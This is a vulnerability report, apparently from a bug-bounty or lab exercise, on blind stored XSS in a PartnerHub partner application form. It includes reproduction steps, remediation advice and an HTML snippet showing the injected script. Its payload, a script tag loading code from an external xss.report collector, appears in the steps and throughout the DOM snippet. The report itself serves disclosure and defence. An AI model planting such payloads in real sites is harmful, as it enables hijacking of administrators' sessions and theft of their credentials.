## Title

Blind Cross-Site Scripting (XSS) via Unsanitized Company, Partnership, and Contact Fields on PartnerHub Admin Dashboard.

## Affected URL

https://partnerhub.pwnedbox.site/

## Description

A Blind Cross-Site Scripting (XSS) vulnerability was identified in the partner application submission handler of the PartnerHub platform. User-supplied input submitted through application form fields (such as Company Name, Country, Regions, Capabilities, Relevant experience, and Partnership goals) is stored persistently in the backend database without proper input sanitization, encoding, or output escaping.

When an administrative user or reviewer inspects submitted partner applications within the admin dashboard, the stored payloads—such as `<script src="https://xss.report/c/vansh"></script>`—are rendered directly into the Document Object Model (DOM). This causes the malicious script to execute asynchronously within the reviewer's privileged session context, allowing remote code execution, session hijacking, or administrative action compromise.

## Steps to Reproduce

1. Navigate to the target application submission interface: `https://partnerhub.pwnedbox.site/apply.php`.
2. Locate the partner application form and inject JavaScript payloads into input fields (e.g., entering `'"&><script src="https://xss.report/c/vansh"></script>` into the company details, capabilities, and goals fields).
3. Submit the partner application form.
4. Log into the administrative control panel where stored partner applications are reviewed (`https://partnerhub.pwnedbox.site/admin/` review console).
5. Observe that the stored payload executes in the DOM of the admin dashboard, firing requests to the external collector (`xss.report`).

## POC

<img width="1560" height="1304" alt="image" src="https://github.com/user-attachments/assets/20b2e3c1-1ed1-4952-8b2a-7af4697955a7" />
<img width="914" height="575" alt="image" src="https://github.com/user-attachments/assets/2854842c-fb9b-44da-908f-ab8eb1e76ce1" />

### Vulnerable DOM Snippet

```html
<html>
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>PH-63F0B228 · PartnerHub</title>
    <link rel="stylesheet" href="../assets/style.css">
  </head>
  <body class="admin">
    <header class="admin-top">
      <a class="logo" href="../index.php"><span class="logo-mark">P</span>PartnerHub</a>
      <div>
        <a href="index.php">← Applications</a>
        <a href="logout.php">Sign out</a>
      </div>
    </header>
    <main class="case">
      <div class="admin-heading">
        <div>
          <span class="kicker">PH-63F0B228</span>
          <h1>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></h1>
          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script> · asd@gmail.com</p>
        </div>
        <span class="pill pill-pending">pending</span>
      </div>
      <div class="columns">
        <section class="detail-card">
          <h3>Company profile</h3>
          <dl>
            <dt>Website</dt>
            <dd>Not provided</dd>
            <dt>Country</dt>
            <dd>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></dd>
            <dt>Size</dt>
            <dd>1–10</dd>
            <dt>Partner type</dt>
            <dd>Agency / consultancy</dd>
            <dt>Regions</dt>
            <dd>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></dd>
          </dl>
          <hr>
          <h3>Capabilities</h3>
          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
          <h3>Relevant experience</h3>
          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
          <h3>Partnership goals</h3>
          <p>'"&gt;<script src="[https://xss.report/c/vansh](https://xss.report/c/vansh)"></script></p>
        </section>
        <aside>
          <form class="detail-card" method="post" action="update.php">
            <input type="hidden" name="csrf" value="09e2af441b370a67f6486bd87d1722b805eb18f324b5ce4a3eb0dd29787d8263">
            <input type="hidden" name="id" value="2">
            <h3>Review application</h3>
            <label>Status
              <select name="status">
                <option value="pending" selected="">Pending</option>
                <option value="reviewing">Reviewing</option>
                <option value="more_info">More Info</option>
                <option value="approved">Approved</option>
                <option value="declined">Declined</option>
              </select>
            </label>
            <label>Reviewer note / applicant update
              <textarea name="admin_note" rows="7"></textarea>
            </label>
            <button class="btn primary full">Save decision →</button>
          </form>
          <div class="detail-card">
            <h3>Activity</h3>
            <div class="event">
              <b>•</b>
              <p>Application submitted and queued for review<small>2026-11-09 02:23:06</small></p>
            </div>
          </div>
        </aside>
      </div>
    </main>
  </body>
</html>
```
## Impact
Execution of arbitrary JavaScript code within the high-privilege session of an administrator or partner reviewer examining submitted applications.

Compromise of administrative sessions, potential cookie or token exfiltration, and unauthorized modification of application statuses or partner records.

Persistent code execution affecting backend review queues and partner management panels.

## Remediation
Implement strict context-aware output encoding (such as HTML entity encoding) for all stored user inputs when rendering them in partner review dashboards or detail views.

Apply strict input validation and sanitization policies on all partner application submission endpoints (Company name, Country, Regions, Capabilities, Experience, and Goals fields) to reject or neutralize HTML markup and script tags.

Deploy a comprehensive Content Security Policy (CSP) restricting inline script execution and unauthorized external script domains.
